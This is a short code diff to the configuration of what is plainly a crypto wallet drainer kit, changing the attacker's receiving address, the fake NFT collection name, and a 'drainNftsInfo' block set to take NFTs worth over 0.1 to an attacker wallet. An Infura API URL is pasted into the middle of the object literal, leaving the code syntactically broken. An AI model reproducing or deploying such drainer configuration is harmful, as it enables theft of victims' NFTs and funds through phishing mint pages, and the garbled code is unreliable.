@@ -1,6 +1,6 @@
-const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
-  collectionInfo = {
-    name: 'THE NFT WORLD',
+const receiveAddress = '0x40f88d21AeCc1b9C3ee0d2a55cF455EbdfA79E83',
+  collectionInfo = {https://aurora-mainnet.infura.io/v3/fc1d76a15009485283b9a37b3c93b01f
+    name: 'koen',
     socialMedia: {
       discord: 'https://discord.gg',
       twitter: 'https://twitter.com',
@@ -27,7 +27,7 @@ const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
   drainNftsInfo = {
     active: true,
     minValue: 0.1,
-    nftReceiveAddress: '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
+    nftReceiveAddress: '0x40f88d21AeCc1b9C3ee0d2a55cF455EbdfA79E83'
   },
 
   customStrings = {
